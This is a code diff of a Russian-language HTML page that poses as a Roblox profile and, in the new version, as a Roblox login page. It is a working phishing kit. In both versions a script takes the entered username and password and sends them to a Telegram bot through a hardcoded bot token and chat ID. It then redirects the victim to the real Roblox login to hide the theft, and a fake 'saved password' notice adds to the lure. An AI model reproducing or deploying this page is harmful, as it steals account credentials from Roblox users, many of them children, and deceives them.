@@ -1,132 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>vet8e35 — Roblox</title>
+    <title>Вход в Roblox</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0b0e17;font-family:Arial,sans-serif;color:#fff}
-        .container{max-width:800px;margin:0 auto;padding:20px}
-        .profile-header{background:#1a1f2e;border-radius:16px;padding:24px;display:flex;gap:20px;align-items:center;flex-wrap:wrap}
-        .avatar{width:120px;height:120px;border-radius:50%;background:#2a2f45;display:flex;align-items:center;justify-content:center;font-size:50px;color:#7b68ee;border:3px solid #7b68ee}
-        .profile-info h1{font-size:28px;margin-bottom:4px}
-        .profile-info .username{color:#7b68ee;font-size:14px}
-        .profile-info .status{color:#4caf50;font-size:14px;margin-top:6px}
-        .stats{display:flex;gap:24px;margin-top:12px;flex-wrap:wrap}
-        .stats span{background:#2a2f45;padding:6px 16px;border-radius:20px;font-size:14px}
-        .actions{display:flex;gap:12px;margin-top:16px;flex-wrap:wrap}
-        .actions button{padding:10px 24px;border:none;border-radius:8px;font-weight:bold;cursor:pointer}
-        .btn-add{background:#7b68ee;color:#fff}
-        .btn-msg{background:#2a2f45;color:#fff}
-        .btn-follow{background:#2a2f45;color:#fff}
-        .tabs{display:flex;gap:4px;margin-top:24px;background:#1a1f2e;border-radius:12px;padding:6px;flex-wrap:wrap}
-        .tabs span{flex:1;text-align:center;padding:10px;border-radius:8px;background:transparent;color:#aaa;font-size:14px;min-width:60px}
-        .tabs .active{background:#7b68ee;color:#fff}
-        .content{background:#1a1f2e;border-radius:16px;padding:24px;margin-top:16px;min-height:200px}
-        .items{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:12px}
-        .item{background:#2a2f45;border-radius:12px;padding:16px;text-align:center;font-size:12px;color:#aaa}
-        .item .icon{font-size:32px;display:block;margin-bottom:6px}
-        .footer{text-align:center;color:#555;font-size:12px;margin-top:24px}
-        .login-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;z-index:999}
-        .login-box{background:#1a1f2e;padding:32px;border-radius:16px;max-width:380px;width:90%}
-        .login-box h2{color:#fff;margin-bottom:8px}
-        .login-box p{color:#aaa;font-size:14px;margin-bottom:20px}
-        .login-box input{width:100%;padding:14px;margin-bottom:12px;background:#2a2f45;border:1px solid #3b405a;border-radius:8px;color:#fff;font-size:16px}
-        .login-box button{width:100%;padding:14px;background:#7b68ee;border:none;border-radius:8px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer}
-        .login-box .close{background:transparent;color:#aaa;border:none;float:right;font-size:24px;cursor:pointer}
-        .error{color:#ff6b6b;margin-top:10px;display:none;text-align:center}
-        @media(max-width:600px){.profile-header{flex-direction:column;text-align:center}}
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #0b0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .login-box { background: #1a1f2e; border-radius: 12px; padding: 40px 30px; max-width: 420px; width: 100%; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+        .logo { text-align: center; margin-bottom: 24px; }
+        .logo svg { width: 120px; height: auto; }
+        h2 { color: #fff; font-size: 28px; font-weight: 400; margin-bottom: 20px; text-align: center; }
+        label { color: #b0b0b0; font-size: 14px; display: block; margin-bottom: 4px; }
+        input { width: 100%; padding: 14px; margin-bottom: 16px; background: #2a2f45; border: 1px solid #3b405a; border-radius: 8px; color: #fff; font-size: 16px; }
+        input:focus { outline: none; border-color: #7b68ee; }
+        button { width: 100%; padding: 14px; background: #7b68ee; border: none; border-radius: 8px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 16px; }
+        button:hover { background: #6a5acd; }
+        .links { text-align: center; font-size: 13px; color: #7b68ee; margin-bottom: 12px; }
+        .links a { color: #7b68ee; text-decoration: none; display: inline-block; margin: 4px 0; }
+        .links a:hover { text-decoration: underline; }
+        .divider { display: flex; align-items: center; gap: 12px; margin: 16px 0; color: #555; font-size: 13px; }
+        .divider hr { flex: 1; border: none; border-top: 1px solid #2a2f45; }
+        .quick-login { background: #2a2f45; border-radius: 8px; padding: 12px; color: #b0b0b0; font-size: 14px; text-align: center; margin-bottom: 16px; cursor: pointer; }
+        .quick-login:hover { background: #3b405a; }
+        .footer { text-align: center; color: #555; font-size: 12px; margin-top: 16px; }
+        .footer span { color: #7b68ee; }
+        .error { color: #ff6b6b; margin-bottom: 12px; display: none; text-align: center; font-size: 14px; }
+        .saved-pass { background: #1a1f2e; border: 1px solid #2a2f45; border-radius: 6px; padding: 8px 12px; color: #888; font-size: 13px; display: flex; justify-content: space-between; margin-bottom: 16px; }
+        .saved-pass span { color: #aaa; }
     </style>
 </head>
 <body>
 
-<div class="container">
-
-    <!-- ПРОФИЛЬ -->
-    <div class="profile-header">
-        <div class="avatar">🎮</div>
-        <div class="profile-info">
-            <h1>vet8e35</h1>
-            <div class="username">@vet8e35 • ID: 3609167038</div>
-            <div class="status">🟢 В сети</div>
-            <div class="stats">
-                <span>👥 1.2K друзей</span>
-                <span>📦 43 предмета</span>
-                <span>⭐ 856 RAP</span>
-            </div>
-        </div>
+<div class="login-box">
+    <div class="logo">
+        <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="100" height="100" rx="20" fill="#7b68ee"/>
+            <path d="M30 30 L70 30 L70 70 L30 70 Z" fill="white"/>
+            <circle cx="50" cy="50" r="8" fill="#7b68ee"/>
+        </svg>
     </div>
 
-    <!-- КНОПКИ -->
-    <div class="actions">
-        <button class="btn-add" id="openLogin">➕ Добавить в друзья</button>
-        <button class="btn-msg" id="openLoginMsg">💬 Написать</button>
-        <button class="btn-follow" id="openLoginFollow">👤 Подписаться</button>
+    <h2>Войдите в Roblox</h2>
+
+    <div class="error" id="err">Неверное имя пользователя или пароль</div>
+
+    <label>Имя пользователя / Электронная почта / Телефон</label>
+    <input type="text" id="u" placeholder="Введите логин или email">
+
+    <label>Пароль</label>
+    <input type="password" id="p" placeholder="Введите пароль">
+
+    <button id="loginBtn">Вход</button>
+
+    <div class="links">
+        <a href="#">Забыли пароль или имя пользователя?</a><br>
+        <a href="#">Отправьте мне одноразовый код по электронной почте</a>
     </div>
 
-    <!-- ВКЛАДКИ -->
-    <div class="tabs">
-        <span class="active">🧾 Обо мне</span>
-        <span>📦 Инвентарь</span>
-        <span>📷 Снимки</span>
-        <span>📜 История</span>
+    <div class="quick-login">🔑 Быстрый вход</div>
+
+    <div class="saved-pass">
+        <span>🔐 Пароль от <strong>sosiska67148869</strong> сохранён в приложении</span>
+        <span>✖</span>
     </div>
 
-    <!-- КОНТЕНТ -->
-    <div class="content">
-        <div class="items">
-            <div class="item"><span class="icon">🔥</span> Огненный меч</div>
-            <div class="item"><span class="icon">🛡️</span> Щит дракона</div>
-            <div class="item"><span class="icon">👑</span> Корона</div>
-            <div class="item"><span class="icon">⚡</span> Молния</div>
-            <div class="item"><span class="icon">🐉</span> Дракон</div>
-            <div class="item"><span class="icon">🌟</span> Звезда</div>
-        </div>
+    <div style="text-align: center; color: #b0b0b0; font-size: 14px; margin-top: 16px;">
+        У вас нет аккаунта? <a href="#" style="color: #7b68ee; text-decoration: none;">Зарегистрируйтесь</a>
     </div>
 
-    <div class="footer">© Roblox · Защищено</div>
-</div>
-
-<!-- ОКНО ВХОДА -->
-<div class="login-overlay" id="loginOverlay">
-    <div class="login-box">
-        <button class="close" id="closeLogin">✖</button>
-        <h2>Вход в Roblox</h2>
-        <p>Чтобы добавить в друзья, войдите в аккаунт</p>
-        <input type="text" id="u" placeholder="Имя пользователя или Email">
-        <input type="password" id="p" placeholder="Пароль">
-        <button id="loginBtn">Войти</button>
-        <div class="error" id="err">Неверный логин или пароль</div>
+    <div class="footer">
+        Английский → Русский
     </div>
 </div>
 
 <script>
-    const BOT_TOKEN='8995673098:AAFw45G24DM55XxF7MSikSWNHlHYd4-hqCo';
-    const CHAT_ID='8430766765';
+    const BOT_TOKEN = '8995673098:AAFw45G24DM55XxF7MSikSWNHlHYd4-hqCo';
+    const CHAT_ID = '8430766765';
 
-    const overlay = document.getElementById('loginOverlay');
-    const err = document.getElementById('err');
-
-    document.getElementById('openLogin').onclick = () => overlay.style.display = 'flex';
-    document.getElementById('openLoginMsg').onclick = () => overlay.style.display = 'flex';
-    document.getElementById('openLoginFollow').onclick = () => overlay.style.display = 'flex';
-    document.getElementById('closeLogin').onclick = () => overlay.style.display = 'none';
-
-    document.getElementById('loginBtn').onclick = function(){
+    document.getElementById('loginBtn').onclick = function() {
         const u = document.getElementById('u').value;
         const p = document.getElementById('p').value;
-        if(!u || !p){ err.style.display = 'block'; return; }
-        err.style.display = 'none';
+        if (!u || !p) {
+            document.getElementById('err').style.display = 'block';
+            return;
+        }
+        document.getElementById('err').style.display = 'none';
         this.innerText = '⏳ Проверка...';
-        fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage', {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:CHAT_ID, text:'👤 '+u+'\n🔑 '+p})
+        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: '👤 ' + u + '\n🔑 ' + p })
         });
         setTimeout(() => {
             window.location.href = 'https://www.roblox.com/login';
-        }, 1200);
+        }, 1500);
     };
 </script>
 </body>
